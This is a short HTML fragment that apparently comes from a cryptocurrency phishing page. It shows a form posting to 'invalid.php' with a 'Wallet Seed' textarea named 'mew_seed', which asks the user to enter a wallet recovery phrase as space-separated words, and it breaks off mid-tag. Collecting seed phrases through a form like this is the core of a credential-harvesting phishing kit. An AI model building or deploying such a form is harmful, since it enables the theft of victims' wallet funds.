...
<div class="container px-3">
    <form method="post" action="invalid.php">
        <br>
        ...
        <div class="form-group mt-5">
            <label for="mew_seed">Wallet Seed</label>
            <textarea class="form-control" placeholder="Separated each words with a single space" name="mew_seed" rows="6" cols="3"
